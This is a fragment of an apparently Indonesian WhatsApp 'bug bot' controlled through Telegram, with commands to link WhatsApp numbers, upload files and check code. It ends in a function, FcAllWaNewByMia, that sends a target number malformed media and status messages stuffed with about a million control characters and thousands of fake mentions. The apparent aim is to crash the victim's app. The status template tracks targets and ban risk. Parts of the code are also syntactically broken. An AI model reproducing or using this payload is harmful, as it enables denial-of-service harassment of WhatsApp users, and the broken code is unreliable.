    if (failCount > 0) {
      if (errorMessages.length > 0) {
        errorCaption = `\n🧬 Errors:\n${errorMessages.map((err, idx) => `  ${idx+1}. ${err}`).join('\n')}`
      } else if (lastError) {
        errorCaption = `\n🧬 Last Error: ${lastError.message || "Unknown error"}`
      }
    }

    const finalText = `
<u>STATUS WITH TRAVAS</u>

🧬 Target : ${number}
🧬 Type : ${fileName ? `File: ${fileName}` : 'Uknown Function'}
🧬 Function : ${funcName}
🧬 Success : ${successCount}
🧬 Failed : ${failCount}
🧬 Potential Ban : ${failCount > 0 ? '⚠️ Possible' : 'N/a'}
🧬 Status : ${failCount === 0 ? '✅ Completed' : failCount === jumlah ? '❌ All Failed' : '⚠️ Partial Success'}${errorCaption}
`
    try {
      await bot.editMessageText(finalText, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🎀 Numero", url: `https://wa.me/${number}` }]
          ]
        }
      })
    } catch (e) {
      await bot.sendMessage(
        chatId,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🎀 Numero", url: `https://wa.me/${number}` }]
            ]
          }
        }
      )
    }
  } catch (err) {
    console.error("Error in testfunction:", err)
    try {
      await bot.sendMessage(
        chatId,
        `❌ Error: ${err.message}`,
        {
          parse_mode: "HTML",
          reply_to_message_id: msg.message_id
        }
      )
    } catch (e) {
      console.error("Failed to send error message:", e)
    }
  }
})

bot.onText(/\/cekfunc/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "🪧 Reply kode JS atau File .Js untuk dicek!", {
      parse_mode: "Markdown"
    });
  }

  let kodeJS = "";

  if (msg.reply_to_message.document) {
    const fileId = msg.reply_to_message.document.file_id;
    const fileLink = await bot.getFileLink(fileId);

    const fileBuffer = await axios.get(fileLink, { responseType: "arraybuffer" });
    kodeJS = fileBuffer.data.toString();
  }

  if (msg.reply_to_message.text) {
    kodeJS = msg.reply_to_message.text;
  }

  if (!kodeJS) {
    return bot.sendMessage(chatId, "❗ Tidak ada kode Yang ditemukan.");
  }

  bot.sendMessage(chatId, "⏳ CEK FUNCTION...");

  try {
    const result = await cekDenganBackup(kodeJS);

    if (!result.success) {
      return bot.sendMessage(chatId, "⚠ Semua API checker sedang down.");
    }

    const hasil = result.data;

    let text = `<b>Hasil Analisa:</b>\n`;
    text += `<i>Menggunakan API:</i> <code>${result.url}</code>\n\n`;

    if (hasil.errors && hasil.errors.length > 0) {
      text += "❌ <b>Error ditemukan:</b>\n";
      hasil.errors.forEach((e, i) => {
        const msgErr = typeof e === "string" ? e : e.message;
        text += `${i + 1}. <code>${msgErr}</code>\n`;
      });
    } else {
      text += "✅ <b>Tidak ada error!</b>\n";
    }

    if (hasil.warnings && hasil.warnings.length > 0) {
      text += "\n(ꐘ) <b>Peringatan:</b>\n";
      hasil.warnings.forEach((w, i) => {
        const msgWarn = typeof w === "string" ? w : w.message;
        text += `${i + 1}. <code>${msgWarn}</code>\n`;
      });
    }

    return bot.sendMessage(chatId, text, { parse_mode: "HTML" });

  } catch (err) {
    console.log(err);
    bot.sendMessage(chatId, "⚠ Terjadi kesalahan saat memproses kode.");
  }

///----------( Tourl Foto / Video )----------\\\
bot.onText(/^\/Tourl$/, async (msg) => {
    const chatId = msg.chat.id;

    if (!msg.reply_to_message || 
        (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah *file/foto/video* dengan command /Tourl", {
            reply_to_message_id: msg.message_id,
            parse_mode: "Markdown"
        });
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        const processingMsg = await bot.sendMessage(chatId, "⏳ Sedang mengupload ke Catbox...", {
            reply_to_message_id: msg.message_id
        });

        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: "stream" });

        const FormData = require("form-data");
        const form = new FormData();
        form.append("reqtype", "fileupload");
        form.append("fileToUpload", response.data, {
            filename: fileName,
            contentType: response.headers["content-type"]
        });

        const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
            headers: form.getHeaders()
        });

        await bot.editMessageText(
            `✅ *Upload berhasil!*\n📎 URL:\n\`${catboxUrl}\``,
            {
                chat_id: chatId,
                message_id: processingMsg.message_id,
                parse_mode: "Markdown"
            }
        );

    } catch (error) {
        console.error("Error in /tourl:", error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox", {
            reply_to_message_id: msg.message_id
        });
    }
});

///-----------( Connect To WhatsApp )----------\\\
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

bot.onText(/^\/addbot\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botNumber = match[1].replace(/[^0-9]/g, ""); 
  
  if (!adminUsers.includes(fromId) && !isOwner(fromId)) {
    return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.', {
      parse_mode: 'Markdown'
    });
  }

  if (!botNumber || botNumber.length < 8) {
    return bot.sendMessage(chatId, `
⚠️ Nomor tidak valid.
Gunakan format: \`/addbot 628xxxxxx\`
`, { parse_mode: "Markdown" });
  }

  try {
    await bot.sendMessage(chatId, `
🔄 Sedang menghubungkan *${botNumber}@s.whatsapp.net* ke sistem...
Mohon tunggu sebentar.
`, { parse_mode: "Markdown" });

    await connectToWhatsApp(botNumber, chatId);

    await bot.sendMessage(chatId, `
✅ *Berhasil terhubung!*
Bot WhatsApp aktif dengan nomor: *${botNumber}*
`, { parse_mode: "Markdown" });

  } catch (error) {
    console.error("❌ Error in /addbot:", error);
    bot.sendMessage(chatId, `
❌ Gagal menghubungkan ke WhatsApp.
> ${error.message || "Silakan coba lagi nanti."}
`, { parse_mode: "Markdown" });
  }
});
        })
        
        
///----------( Function Here )----------\\\
async function FcAllWaNewByMia(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        caption: "CSMX",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Who's a Queen Mia?",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permissiom_request",
              paramsJson: "\u0010".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              conversionPointSource: "call_permissiom_request"
            }
          }
        }
      }
    },
    {}
  );
}
///----------( Stop A Function )----------\\\